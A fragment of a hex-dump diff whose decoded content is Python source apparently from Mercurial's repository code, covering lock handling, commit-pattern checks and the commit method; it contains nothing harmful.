+0001bc80: 652c 0a20 2020 2020 2020 2020 2020 205f  e,.            _
+0001bc90: 2862 2777 6f72 6b69 6e67 2064 6972 6563  (b'working direc
+0001bca0: 746f 7279 206f 6620 2573 2729 2025 2073  tory of %s') % s
+0001bcb0: 656c 662e 6f72 6967 726f 6f74 2c0a 2020  elf.origroot,.  
+0001bcc0: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+0001bcd0: 7365 6c66 2e5f 776c 6f63 6b72 6566 203d  self._wlockref =
+0001bce0: 2077 6561 6b72 6566 2e72 6566 286c 290a   weakref.ref(l).
+0001bcf0: 2020 2020 2020 2020 7265 7475 726e 206c          return l
+0001bd00: 0a0a 2020 2020 6465 6620 5f63 7572 7265  ..    def _curre
+0001bd10: 6e74 6c6f 636b 2873 656c 662c 206c 6f63  ntlock(self, loc
+0001bd20: 6b72 6566 293a 0a20 2020 2020 2020 2022  kref):.        "
+0001bd30: 2222 5265 7475 726e 7320 7468 6520 6c6f  ""Returns the lo
+0001bd40: 636b 2069 6620 6974 2773 2068 656c 642c  ck if it's held,
+0001bd50: 206f 7220 4e6f 6e65 2069 6620 6974 2773   or None if it's
+0001bd60: 206e 6f74 2e22 2222 0a20 2020 2020 2020   not.""".       
+0001bd70: 2069 6620 6c6f 636b 7265 6620 6973 204e   if lockref is N
+0001bd80: 6f6e 653a 0a20 2020 2020 2020 2020 2020  one:.           
+0001bd90: 2072 6574 7572 6e20 4e6f 6e65 0a20 2020   return None.   
+0001bda0: 2020 2020 206c 203d 206c 6f63 6b72 6566       l = lockref
+0001bdb0: 2829 0a20 2020 2020 2020 2069 6620 6c20  ().        if l 
+0001bdc0: 6973 204e 6f6e 6520 6f72 206e 6f74 206c  is None or not l
+0001bdd0: 2e68 656c 643a 0a20 2020 2020 2020 2020  .held:.         
+0001bde0: 2020 2072 6574 7572 6e20 4e6f 6e65 0a20     return None. 
+0001bdf0: 2020 2020 2020 2072 6574 7572 6e20 6c0a         return l.
+0001be00: 0a20 2020 2064 6566 2063 7572 7265 6e74  .    def current
+0001be10: 776c 6f63 6b28 7365 6c66 293a 0a20 2020  wlock(self):.   
+0001be20: 2020 2020 2022 2222 5265 7475 726e 7320       """Returns 
+0001be30: 7468 6520 776c 6f63 6b20 6966 2069 7427  the wlock if it'
+0001be40: 7320 6865 6c64 2c20 6f72 204e 6f6e 6520  s held, or None 
+0001be50: 6966 2069 7427 7320 6e6f 742e 2222 220a  if it's not.""".
+0001be60: 2020 2020 2020 2020 7265 7475 726e 2073          return s
+0001be70: 656c 662e 5f63 7572 7265 6e74 6c6f 636b  elf._currentlock
+0001be80: 2873 656c 662e 5f77 6c6f 636b 7265 6629  (self._wlockref)
+0001be90: 0a0a 2020 2020 6465 6620 6368 6563 6b63  ..    def checkc
+0001bea0: 6f6d 6d69 7470 6174 7465 726e 7328 7365  ommitpatterns(se
+0001beb0: 6c66 2c20 7763 7478 2c20 6d61 7463 682c  lf, wctx, match,
+0001bec0: 2073 7461 7475 732c 2066 6169 6c29 3a0a   status, fail):.
+0001bed0: 2020 2020 2020 2020 2222 2263 6865 636b          """check
+0001bee0: 2066 6f72 2063 6f6d 6d69 7420 6172 6775   for commit argu
+0001bef0: 6d65 6e74 7320 7468 6174 2061 7265 6e27  ments that aren'
+0001bf00: 7420 636f 6d6d 6974 7461 626c 6522 2222  t committable"""
+0001bf10: 0a20 2020 2020 2020 2069 6620 6d61 7463  .        if matc
+0001bf20: 682e 6973 6578 6163 7428 2920 6f72 206d  h.isexact() or m
+0001bf30: 6174 6368 2e70 7265 6669 7828 293a 0a20  atch.prefix():. 
+0001bf40: 2020 2020 2020 2020 2020 206d 6174 6368             match
+0001bf50: 6564 203d 2073 6574 2873 7461 7475 732e  ed = set(status.
+0001bf60: 6d6f 6469 6669 6564 202b 2073 7461 7475  modified + statu
+0001bf70: 732e 6164 6465 6420 2b20 7374 6174 7573  s.added + status
+0001bf80: 2e72 656d 6f76 6564 290a 0a20 2020 2020  .removed)..     
+0001bf90: 2020 2020 2020 2066 6f72 2066 2069 6e20         for f in 
+0001bfa0: 6d61 7463 682e 6669 6c65 7328 293a 0a20  match.files():. 
+0001bfb0: 2020 2020 2020 2020 2020 2020 2020 2066                 f
+0001bfc0: 203d 2073 656c 662e 6469 7273 7461 7465   = self.dirstate
+0001bfd0: 2e6e 6f72 6d61 6c69 7a65 2866 290a 2020  .normalize(f).  
+0001bfe0: 2020 2020 2020 2020 2020 2020 2020 6966                if
+0001bff0: 2066 203d 3d20 6227 2e27 206f 7220 6620   f == b'.' or f 
+0001c000: 696e 206d 6174 6368 6564 206f 7220 6620  in matched or f 
+0001c010: 696e 2077 6374 782e 7375 6273 7461 7465  in wctx.substate
+0001c020: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+0001c030: 2020 2020 2020 636f 6e74 696e 7565 0a20        continue. 
+0001c040: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+0001c050: 6620 6620 696e 2073 7461 7475 732e 6465  f f in status.de
+0001c060: 6c65 7465 643a 0a20 2020 2020 2020 2020  leted:.         
+0001c070: 2020 2020 2020 2020 2020 2066 6169 6c28             fail(
+0001c080: 662c 205f 2862 2766 696c 6520 6e6f 7420  f, _(b'file not 
+0001c090: 666f 756e 6421 2729 290a 2020 2020 2020  found!')).      
+0001c0a0: 2020 2020 2020 2020 2020 2320 4973 2069            # Is i
+0001c0b0: 7420 6120 6469 7265 6374 6f72 7920 7468  t a directory th
+0001c0c0: 6174 2065 7869 7374 7320 6f72 2075 7365  at exists or use
+0001c0d0: 6420 746f 2065 7869 7374 3f0a 2020 2020  d to exist?.    
+0001c0e0: 2020 2020 2020 2020 2020 2020 6966 2073              if s
+0001c0f0: 656c 662e 7776 6673 2e69 7364 6972 2866  elf.wvfs.isdir(f
+0001c100: 2920 6f72 2077 6374 782e 7031 2829 2e68  ) or wctx.p1().h
+0001c110: 6173 6469 7228 6629 3a0a 2020 2020 2020  asdir(f):.      
+0001c120: 2020 2020 2020 2020 2020 2020 2020 6420                d 
+0001c130: 3d20 6620 2b20 6227 2f27 0a20 2020 2020  = f + b'/'.     
+0001c140: 2020 2020 2020 2020 2020 2020 2020 2066                 f
+0001c150: 6f72 206d 6620 696e 206d 6174 6368 6564  or mf in matched
+0001c160: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+0001c170: 2020 2020 2020 2020 2020 6966 206d 662e            if mf.
+0001c180: 7374 6172 7473 7769 7468 2864 293a 0a20  startswith(d):. 
+0001c190: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001c1a0: 2020 2020 2020 2020 2020 2062 7265 616b             break
+0001c1b0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+0001c1c0: 2020 2020 2065 6c73 653a 0a20 2020 2020       else:.     
+0001c1d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001c1e0: 2020 2066 6169 6c28 662c 205f 2862 226e     fail(f, _(b"n
+0001c1f0: 6f20 6d61 7463 6820 756e 6465 7220 6469  o match under di
+0001c200: 7265 6374 6f72 7921 2229 290a 2020 2020  rectory!")).    
+0001c210: 2020 2020 2020 2020 2020 2020 656c 6966              elif
+0001c220: 2066 206e 6f74 2069 6e20 7365 6c66 2e64   f not in self.d
+0001c230: 6972 7374 6174 653a 0a20 2020 2020 2020  irstate:.       
+0001c240: 2020 2020 2020 2020 2020 2020 2066 6169               fai
+0001c250: 6c28 662c 205f 2862 2266 696c 6520 6e6f  l(f, _(b"file no
+0001c260: 7420 7472 6163 6b65 6421 2229 290a 0a20  t tracked!")).. 
+0001c270: 2020 2040 756e 6669 6c74 6572 6564 6d65     @unfilteredme
+0001c280: 7468 6f64 0a20 2020 2064 6566 2063 6f6d  thod.    def com
+0001c290: 6d69 7428 0a20 2020 2020 2020 2073 656c  mit(.        sel
+0001c2a0: 662c 0a20 2020 2020 2020 2074 6578 743d  f,.        text=
+0001c2b0: 6222 222c 0a20 2020 2020 2020 2075 7365  b"",.        use
+0001c2c0: 723d 4e6f 6e65 2c0a 2020 2020 2020 2020  r=None,.        
+0001c2d0: 6461 7465 3d4e 6f6e 652c 0a20 2020 2020  date=None,.     
+0001c2e0: 2020 206d 6174 6368 3d4e 6f6e 652c 0a20     match=None,. 
+0001c2f0: 2020 2020 2020 2066 6f72 6365 3d46 616c         force=Fal
+0001c300: 7365 2c0a 2020 2020 2020 2020 6564 6974  se,.        edit
+0001c310: 6f72 3d4e 6f6e 652c 0a20 2020 2020 2020  or=None,.       
+0001c320: 2065 7874 7261 3d4e 6f6e 652c 0a20 2020   extra=None,.   
+0001c330: 2029 3a0a 2020 2020 2020 2020 2222 2241   ):.        """A
+0001c340: 6464 2061 206e 6577 2072 6576 6973 696f  dd a new revisio
+0001c350: 6e20 746f 2063 7572 7265 6e74 2072 6570  n to current rep
+0001c360: 6f73 6974 6f72 792e 0a0a 2020 2020 2020  ository...      
+0001c370: 2020 5265 7669 7369 6f6e 2069 6e66 6f72    Revision infor
+0001c380: 6d61 7469 6f6e 2069 7320 6761 7468 6572  mation is gather
+0001c390: 6564 2066 726f 6d20 7468 6520 776f 726b  ed from the work
+0001c3a0: 696e 6720 6469 7265 6374 6f72 792c 0a20  ing directory,. 
+0001c3b0: 2020 2020 2020 206d 6174 6368 2063 616e         match can
+0001c3c0: 2062 6520 7573 6564 2074 6f20 6669 6c74   be used to filt
+0001c3d0: 6572 2074 6865 2063 6f6d 6d69 7474 6564  er the committed
+0001c3e0: 2066 696c 6573 2e20 4966 2065 6469 746f   files. If edito
+0001c3f0: 7220 6973 0a20 2020 2020 2020 2073 7570  r is.        sup
+0001c400: 706c 6965 642c 2069 7420 6973 2063 616c  plied, it is cal
+0001c410: 6c65 6420 746f 2067 6574 2061 2063 6f6d  led to get a com
+0001c420: 6d69 7420 6d65 7373 6167 652e 0a20 2020  mit message..   
+0001c430: 2020 2020 2022 2222 0a20 2020 2020 2020       """.       
+0001c440: 2069 6620 6578 7472 6120 6973 204e 6f6e   if extra is Non
+0001c450: 653a 0a20 2020 2020 2020 2020 2020 2065  e:.            e
+0001c460: 7874 7261 203d 207b 7d0a 0a20 2020 2020  xtra = {}..     
+0001c470: 2020 2064 6566 2066 6169 6c28 662c 206d     def fail(f, m
+0001c480: 7367 293a 0a20 2020 2020 2020 2020 2020  sg):.           
+0001c490: 2072 6169 7365 2065 7272 6f72 2e49 6e70   raise error.Inp
+0001c4a0: 7574 4572 726f 7228 6227 2573 3a20 2573  utError(b'%s: %s
+0001c4b0: 2720 2520 2866 2c20 6d73 6729 290a 0a20  ' % (f, msg)).. 
+0001c4c0: 2020 2020 2020 2069 6620 6e6f 7420 6d61         if not ma
+0001c4d0: 7463 683a 0a20 2020 2020 2020 2020 2020  tch:.           
+0001c4e0: 206d 6174 6368 203d 206d 6174 6368 6d6f   match = matchmo
+0001c4f0: 642e 616c 7761 7973 2829 0a0a 2020 2020  d.always()..    
+0001c500: 2020 2020 6966 206e 6f74 2066 6f72 6365      if not force
+0001c510: 3a0a 2020 2020 2020 2020 2020 2020 6d61  :.            ma
+0001c520: 7463 682e 6261 6420 3d20 6661 696c 0a0a  tch.bad = fail..
+0001c530: 2020 2020 2020 2020 2320 6c6f 636b 2829          # lock()
+0001c540: 2066 6f72 2072 6563 656e 7420 6368 616e   for recent chan
+0001c550: 6765 6c6f 6720 2873 6565 2069 7373 7565  gelog (see issue
+0001c560: 3433 3638 290a 2020 2020 2020 2020 7769  4368).        wi
+0001c570: 7468 2073 656c 662e 776c 6f63 6b28 292c  th self.wlock(),
+0001c580: 2073 656c 662e 6c6f 636b 2829 3a0a 2020   self.lock():.  
+0001c590: 2020 2020 2020 2020 2020 7763 7478 203d            wctx =
+0001c5a0: 2073 656c 665b 4e6f 6e65 5d0a 2020 2020   self[None].    
+0001c5b0: 2020 2020 2020 2020 6d65 7267 6520 3d20          merge = 
+0001c5c0: 6c65 6e28 7763 7478 2e70 6172 656e 7473  len(wctx.parents
+0001c5d0: 2829 2920 3e20 310a 0a20 2020 2020 2020  ()) > 1..       
+0001c5e0: 2020 2020 2069 6620 6e6f 7420 666f 7263       if not forc
+0001c5f0: 6520 616e 6420 6d65 7267 6520 616e 6420  e and merge and 
+0001c600: 6e6f 7420 6d61 7463 682e 616c 7761 7973  not match.always
+0001c610: 2829 3a0a 2020 2020 2020 2020 2020 2020  ():.            
+0001c620: 2020 2020 7261 6973 6520 6572 726f 722e      raise error.
+0001c630: 4162 6f72 7428 0a20 2020 2020 2020 2020  Abort(.         
+0001c640: 2020 2020 2020 2020 2020 205f 280a 2020             _(.  
+0001c650: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001c660: 2020 2020 2020 6227 6361 6e6e 6f74 2070        b'cannot p
+0001c670: 6172 7469 616c 6c79 2063 6f6d 6d69 7420  artially commit 
+0001c680: 6120 6d65 7267 6520 270a 2020 2020 2020  a merge '.      
 0001c690: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001c6a0: 2020 2020 2069 6620 6d66 2e73 7461 7274       if mf.start
-0001c6b0: 7377 6974 6828 6429 3a0a 2020 2020 2020  swith(d):.      
-0001c6c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001c6d0: 2020 2020 2020 6272 6561 6b0a 2020 2020        break.    
-0001c6e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001c6f0: 656c 7365 3a0a 2020 2020 2020 2020 2020  else:.          
-0001c700: 2020 2020 2020 2020 2020 2020 2020 6661                fa
-0001c710: 696c 2866 2c20 5f28 6222 6e6f 206d 6174  il(f, _(b"no mat
-0001c720: 6368 2075 6e64 6572 2064 6972 6563 746f  ch under directo
-0001c730: 7279 2122 2929 0a20 2020 2020 2020 2020  ry!")).         
-0001c740: 2020 2020 2020 2065 6c69 6620 6620 6e6f         elif f no
-0001c750: 7420 696e 2073 656c 662e 6469 7273 7461  t in self.dirsta
-0001c760: 7465 3a0a 2020 2020 2020 2020 2020 2020  te:.            
-0001c770: 2020 2020 2020 2020 6661 696c 2866 2c20          fail(f, 
-0001c780: 5f28 6222 6669 6c65 206e 6f74 2074 7261  _(b"file not tra
-0001c790: 636b 6564 2122 2929 0a0a 2020 2020 4075  cked!"))..    @u
-0001c7a0: 6e66 696c 7465 7265 646d 6574 686f 640a  nfilteredmethod.
-0001c7b0: 2020 2020 6465 6620 636f 6d6d 6974 280a      def commit(.
-0001c7c0: 2020 2020 2020 2020 7365 6c66 2c0a 2020          self,.  
-0001c7d0: 2020 2020 2020 7465 7874 3d62 2222 2c0a        text=b"",.
-0001c7e0: 2020 2020 2020 2020 7573 6572 3d4e 6f6e          user=Non
-0001c7f0: 652c 0a20 2020 2020 2020 2064 6174 653d  e,.        date=
-0001c800: 4e6f 6e65 2c0a 2020 2020 2020 2020 6d61  None,.        ma
-0001c810: 7463 683d 4e6f 6e65 2c0a 2020 2020 2020  tch=None,.      
-0001c820: 2020 666f 7263 653d 4661 6c73 652c 0a20    force=False,. 
-0001c830: 2020 2020 2020 2065 6469 746f 723d 4e6f         editor=No
-0001c840: 6e65 2c0a 2020 2020 2020 2020 6578 7472  ne,.        extr
-0001c850: 613d 4e6f 6e65 2c0a 2020 2020 293a 0a20  a=None,.    ):. 
-0001c860: 2020 2020 2020 2022 2222 4164 6420 6120         """Add a 
-0001c870: 6e65 7720 7265 7669 7369 6f6e 2074 6f20  new revision to 
-0001c880: 6375 7272 656e 7420 7265 706f 7369 746f  current reposito
-0001c890: 7279 2e0a 0a20 2020 2020 2020 2052 6576  ry...        Rev
-0001c8a0: 6973 696f 6e20 696e 666f 726d 6174 696f  ision informatio
-0001c8b0: 6e20 6973 2067 6174 6865 7265 6420 6672  n is gathered fr
-0001c8c0: 6f6d 2074 6865 2077 6f72 6b69 6e67 2064  om the working d
-0001c8d0: 6972 6563 746f 7279 2c0a 2020 2020 2020  irectory,.      
-0001c8e0: 2020 6d61 7463 6820 6361 6e20 6265 2075    match can be u
-0001c8f0: 7365 6420 746f 2066 696c 7465 7220 7468  sed to filter th
-0001c900: 6520 636f 6d6d 6974 7465 6420 6669 6c65  e committed file
-0001c910: 732e 2049 6620 6564 6974 6f72 2069 730a  s. If editor is.
-0001c920: 2020 2020 2020 2020 7375 7070 6c69 6564          supplied
-0001c930: 2c20 6974 2069 7320 6361 6c6c 6564 2074  , it is called t
-0001c940: 6f20 6765 7420 6120 636f 6d6d 6974 206d  o get a commit m
-0001c950: 6573 7361 6765 2e0a 2020 2020 2020 2020  essage..        
-0001c960: 2222 220a 2020 2020 2020 2020 6966 2065  """.        if e
-0001c970: 7874 7261 2069 7320 4e6f 6e65 3a0a 2020  xtra is None:.  
-0001c980: 2020 2020 2020 2020 2020 6578 7472 6120            extra 
-0001c990: 3d20 7b7d 0a0a 2020 2020 2020 2020 6465  = {}..        de
-0001c9a0: 6620 6661 696c 2866 2c20 6d73 6729 3a0a  f fail(f, msg):.
-0001c9b0: 2020 2020 2020 2020 2020 2020 7261 6973              rais
-0001c9c0: 6520 6572 726f 722e 496e 7075 7445 7272  e error.InputErr
-0001c9d0: 6f72 2862 2725 733a 2025 7327 2025 2028  or(b'%s: %s' % (
-0001c9e0: 662c 206d 7367 2929 0a0a 2020 2020 2020  f, msg))..      
-0001c9f0: 2020 6966 206e 6f74 206d 6174 6368 3a0a    if not match:.
-0001ca00: 2020 2020 2020 2020 2020 2020 6d61 7463              matc
-0001ca10: 6820 3d20 6d61 7463 686d 6f64 2e61 6c77  h = matchmod.alw
-0001ca20: 6179 7328 290a 0a20 2020 2020 2020 2069  ays()..        i
-0001ca30: 6620 6e6f 7420 666f 7263 653a 0a20 2020  f not force:.   
-0001ca40: 2020 2020 2020 2020 206d 6174 6368 2e62           match.b
-0001ca50: 6164 203d 2066 6169 6c0a 0a20 2020 2020  ad = fail..     
-0001ca60: 2020 2023 206c 6f63 6b28 2920 666f 7220     # lock() for 
-0001ca70: 7265 6365 6e74 2063 6861 6e67 656c 6f67  recent changelog
-0001ca80: 2028 7365 6520 6973 7375 6534 3336 3829   (see issue4368)
-0001ca90: 0a20 2020 2020 2020 2077 6974 6820 7365  .        with se
-0001caa0: 6c66 2e77 6c6f 636b 2829 2c20 7365 6c66  lf.wlock(), self
-0001cab0: 2e6c 6f63 6b28 293a 0a20 2020 2020 2020  .lock():.       
-0001cac0: 2020 2020 2077 6374 7820 3d20 7365 6c66       wctx = self
-0001cad0: 5b4e 6f6e 655d 0a20 2020 2020 2020 2020  [None].         
-0001cae0: 2020 206d 6572 6765 203d 206c 656e 2877     merge = len(w
-0001caf0: 6374 782e 7061 7265 6e74 7328 2929 203e  ctx.parents()) >
-0001cb00: 2031 0a0a 2020 2020 2020 2020 2020 2020   1..            
-0001cb10: 6966 206e 6f74 2066 6f72 6365 2061 6e64  if not force and
-0001cb20: 206d 6572 6765 2061 6e64 206e 6f74 206d   merge and not m
-0001cb30: 6174 6368 2e61 6c77 6179 7328 293a 0a20  atch.always():. 
-0001cb40: 2020 2020 2020 2020 2020 2020 2020 2072                 r
-0001cb50: 6169 7365 2065 7272 6f72 2e41 626f 7274  aise error.Abort
-0001cb60: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
-0001cb70: 2020 2020 2020 5f28 0a20 2020 2020 2020        _(.       
-0001cb80: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001cb90: 2062 2763 616e 6e6f 7420 7061 7274 6961   b'cannot partia
-0001cba0: 6c6c 7920 636f 6d6d 6974 2061 206d 6572  lly commit a mer
-0001cbb0: 6765 2027 0a20 2020 2020 2020 2020 2020  ge '.           
-0001cbc0: 2020 2020 2020 2020 2020 2020 2062 2728               b'(
-0001cbd0: 646f 206e 6f74 2073 7065 6369 6679 2066  do not specify f
-0001cbe0: 696c 6573 206f 7220 7061 7474 6572 6e73  iles or patterns
-0001cbf0: 2927 0a20 2020 2020 2020 2020 2020 2020  )'.             
-0001cc00: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
-0001cc10: 2020 2020 2020 2020 2029 0a0a 2020 2020           )..    
-0001cc20: 2020 2020 2020 2020 7374 6174 7573 203d          status =
-0001cc30: 2073 656c 662e 7374 6174 7573 286d 6174   self.status(mat
-0001cc40: 6368 3d6d 6174 6368 2c20 636c 6561 6e3d  ch=match, clean=
-0001cc50: 666f 7263 6529 0a20 2020 2020 2020 2020  force).         
-0001cc60: 2020 2069 6620 666f 7263 653a 0a20 2020     if force:.   
-0001cc70: 2020 2020 2020 2020 2020 2020 2073 7461               sta
-0001cc80: 7475 732e 6d6f 6469 6669 6564 2e65 7874  tus.modified.ext
-0001cc90: 656e 6428 0a20 2020 2020 2020 2020 2020  end(.           
-0001cca0: 2020 2020 2020 2020 2073 7461 7475 732e           status.
-0001ccb0: 636c 6561 6e0a 2020 2020 2020 2020 2020  clean.          
-0001ccc0: 2020 2020 2020 2920 2023 206d 7120 6d61        )  # mq ma
-0001ccd0: 7920 636f 6d6d 6974 2063 6c65 616e 2066  y commit clean f
-0001cce0: 696c 6573 0a0a 2020 2020 2020 2020 2020  iles..          
-0001ccf0: 2020 2320 6368 6563 6b20 7375 6272 6570    # check subrep
-0001cd00: 6f73 0a20 2020 2020 2020 2020 2020 2073  os.            s
-0001cd10: 7562 732c 2063 6f6d 6d69 7473 7562 732c  ubs, commitsubs,
-0001cd20: 206e 6577 7374 6174 6520 3d20 7375 6272   newstate = subr
-0001cd30: 6570 6f75 7469 6c2e 7072 6563 6f6d 6d69  epoutil.precommi
-0001cd40: 7428 0a20 2020 2020 2020 2020 2020 2020  t(.             
-0001cd50: 2020 2073 656c 662e 7569 2c20 7763 7478     self.ui, wctx
-0001cd60: 2c20 7374 6174 7573 2c20 6d61 7463 682c  , status, match,
-0001cd70: 2066 6f72 6365 3d66 6f72 6365 0a20 2020   force=force.   
-0001cd80: 2020 2020 2020 2020 2029 0a0a 2020 2020           )..    
-0001cd90: 2020 2020 2020 2020 2320 6d61 6b65 2073          # make s
-0001cda0: 7572 6520 616c 6c20 6578 706c 6963 6974  ure all explicit
-0001cdb0: 2070 6174 7465 726e 7320 6172 6520 6d61   patterns are ma
-0001cdc0: 7463 6865 640a 2020 2020 2020 2020 2020  tched.          
-0001cdd0: 2020 6966 206e 6f74 2066 6f72 6365 3a0a    if not force:.
-0001cde0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001cdf0: 7365 6c66 2e63 6865 636b 636f 6d6d 6974  self.checkcommit
-0001ce00: 7061 7474 6572 6e73 2877 6374 782c 206d  patterns(wctx, m
-0001ce10: 6174 6368 2c20 7374 6174 7573 2c20 6661  atch, status, fa
-0001ce20: 696c 290a 0a20 2020 2020 2020 2020 2020  il)..           
-0001ce30: 2063 6374 7820 3d20 636f 6e74 6578 742e   cctx = context.
-0001ce40: 776f 726b 696e 6763 6f6d 6d69 7463 7478  workingcommitctx
-0001ce50: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
-0001ce60: 2020 7365 6c66 2c20 7374 6174 7573 2c20    self, status, 
-0001ce70: 7465 7874 2c20 7573 6572 2c20 6461 7465  text, user, date
-0001ce80: 2c20 6578 7472 610a 2020 2020 2020 2020  , extra.        
-0001ce90: 2020 2020 290a 0a20 2020 2020 2020 2020      )..         
-0001cea0: 2020 206d 7320 3d20 6d65 7267 6573 7461     ms = mergesta
-0001ceb0: 7465 6d6f 642e 6d65 7267 6573 7461 7465  temod.mergestate
-0001cec0: 2e72 6561 6428 7365 6c66 290a 2020 2020  .read(self).    
-0001ced0: 2020 2020 2020 2020 6d65 7267 6575 7469          mergeuti
-0001cee0: 6c2e 6368 6563 6b75 6e72 6573 6f6c 7665  l.checkunresolve
-0001cef0: 6428 6d73 290a 0a20 2020 2020 2020 2020  d(ms)..         
-0001cf00: 2020 2023 2069 6e74 6572 6e61 6c20 636f     # internal co
-0001cf10: 6e66 6967 3a20 7569 2e61 6c6c 6f77 656d  nfig: ui.allowem
-0001cf20: 7074 7963 6f6d 6d69 740a 2020 2020 2020  ptycommit.      
-0001cf30: 2020 2020 2020 6966 2063 6374 782e 6973        if cctx.is
-0001cf40: 656d 7074 7928 2920 616e 6420 6e6f 7420  empty() and not 
-0001cf50: 7365 6c66 2e75 692e 636f 6e66 6967 626f  self.ui.configbo
-0001cf60: 6f6c 280a 2020 2020 2020 2020 2020 2020  ol(.            
-0001cf70: 2020 2020 6227 7569 272c 2062 2761 6c6c      b'ui', b'all
-0001cf80: 6f77 656d 7074 7963 6f6d 6d69 7427 0a20  owemptycommit'. 
-0001cf90: 2020 2020 2020 2020 2020 2029 3a0a 2020             ):.  
-0001cfa0: 2020 2020 2020 2020 2020 2020 2020 7365                se
-0001cfb0: 6c66 2e75 692e 6465 6275 6728 6227 6e6f  lf.ui.debug(b'no
-0001cfc0: 7468 696e 6720 746f 2063 6f6d 6d69 742c  thing to commit,
-0001cfd0: 2063 6c65 6172 696e 6720 6d65 7267 6520   clearing merge 
-0001cfe0: 7374 6174 655c 6e27 290a 2020 2020 2020  state\n').      
-0001cff0: 2020 2020 2020 2020 2020 6d73 2e72 6573            ms.res
-0001d000: 6574 2829 0a20 2020 2020 2020 2020 2020  et().           
-0001d010: 2020 2020 2072 6574 7572 6e20 4e6f 6e65       return None
-0001d020: 0a0a 2020 2020 2020 2020 2020 2020 6966  ..            if
-0001d030: 206d 6572 6765 2061 6e64 2063 6374 782e   merge and cctx.
-0001d040: 6465 6c65 7465 6428 293a 0a20 2020 2020  deleted():.     
-0001d050: 2020 2020 2020 2020 2020 2072 6169 7365             raise
-0001d060: 2065 7272 6f72 2e41 626f 7274 285f 2862   error.Abort(_(b
-0001d070: 2263 616e 6e6f 7420 636f 6d6d 6974 206d  "cannot commit m
-0001d080: 6572 6765 2077 6974 6820 6d69 7373 696e  erge with missin
-0001d090: 6720 6669 6c65 7322 2929 0a0a 2020 2020  g files"))..    
-0001d0a0: 2020 2020 2020 2020 6966 2065 6469 746f          if edito
-0001d0b0: 723a 0a20 2020 2020 2020 2020 2020 2020  r:.             
-0001d0c0: 2020 2063 6374 782e 5f74 6578 7420 3d20     cctx._text = 
-0001d0d0: 6564 6974 6f72 2873 656c 662c 2063 6374  editor(self, cct
-0001d0e0: 782c 2073 7562 7329 0a20 2020 2020 2020  x, subs).       
-0001d0f0: 2020 2020 2065 6469 7465 6420 3d20 7465       edited = te
-0001d100: 7874 2021 3d20 6363 7478 2e5f 7465 7874  xt != cctx._text
-0001d110: 0a0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-0001d120: 5361 7665 2063 6f6d 6d69 7420 6d65 7373  Save commit mess
-0001d130: 6167 6520 696e 2063 6173 6520 7468 6973  age in case this
-0001d140: 2074 7261 6e73 6163 7469 6f6e 2067 6574   transaction get
-0001d150: 7320 726f 6c6c 6564 2062 6163 6b0a 2020  s rolled back.  
-0001d160: 2020 2020 2020 2020 2020 2320 2865 2e67            # (e.g
-0001d170: 2e20 6279 2061 2070 7265 7478 6e63 6f6d  . by a pretxncom
-0001d180: 6d69 7420 686f 6f6b 292e 2020 4c65 6176  mit hook).  Leav
-0001d190: 6520 7468 6520 636f 6e74 656e 7420 616c  e the content al
-0001d1a0: 6f6e 6520 6f6e 0a20 2020 2020 2020 2020  one on.         
-0001d1b0: 2020 2023 2074 6865 2061 7373 756d 7074     # the assumpt
-0001d1c0: 696f 6e20 7468 6174 2074 6865 2075 7365  ion that the use
-0001d1d0: 7220 7769 6c6c 2075 7365 2074 6865 2073  r will use the s
-0001d1e0: 616d 6520 6564 6974 6f72 2061 6761 696e  ame editor again
-0001d1f0: 2e0a 2020 2020 2020 2020 2020 2020 6d73  ..            ms
-0001d200: 675f 7061 7468 203d 2073 656c 662e 7361  g_path = self.sa
-0001d210: 7665 636f 6d6d 6974 6d65 7373 6167 6528  vecommitmessage(
-0001d220: 6363 7478 2e5f 7465 7874 290a 0a20 2020  cctx._text)..   
-0001d230: 2020 2020 2020 2020 2023 2063 6f6d 6d69           # commi
-0001d240: 7420 7375 6273 2061 6e64 2077 7269 7465  t subs and write
-0001d250: 206e 6577 2073 7461 7465 0a20 2020 2020   new state.     
-0001d260: 2020 2020 2020 2069 6620 7375 6273 3a0a         if subs:.
-0001d270: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d280: 7569 7061 7468 666e 203d 2073 636d 7574  uipathfn = scmut
-0001d290: 696c 2e67 6574 7569 7061 7468 666e 2873  il.getuipathfn(s
-0001d2a0: 656c 6629 0a20 2020 2020 2020 2020 2020  elf).           
-0001d2b0: 2020 2020 2066 6f72 2073 2069 6e20 736f       for s in so
-0001d2c0: 7274 6564 2863 6f6d 6d69 7473 7562 7329  rted(commitsubs)
-0001d2d0: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0001d2e0: 2020 2020 2020 7375 6220 3d20 7763 7478        sub = wctx
-0001d2f0: 2e73 7562 2873 290a 2020 2020 2020 2020  .sub(s).        
-0001d300: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-0001d310: 2e75 692e 7374 6174 7573 280a 2020 2020  .ui.status(.    
-0001d320: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d330: 2020 2020 5f28 6227 636f 6d6d 6974 7469      _(b'committi
-0001d340: 6e67 2073 7562 7265 706f 7369 746f 7279  ng subrepository
-0001d350: 2025 735c 6e27 290a 2020 2020 2020 2020   %s\n').        
-0001d360: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d370: 2520 7569 7061 7468 666e 2873 7562 7265  % uipathfn(subre
-0001d380: 706f 7574 696c 2e73 7562 7265 6c70 6174  poutil.subrelpat
-0001d390: 6828 7375 6229 290a 2020 2020 2020 2020  h(sub)).        
-0001d3a0: 2020 2020 2020 2020 2020 2020 290a 2020              ).  
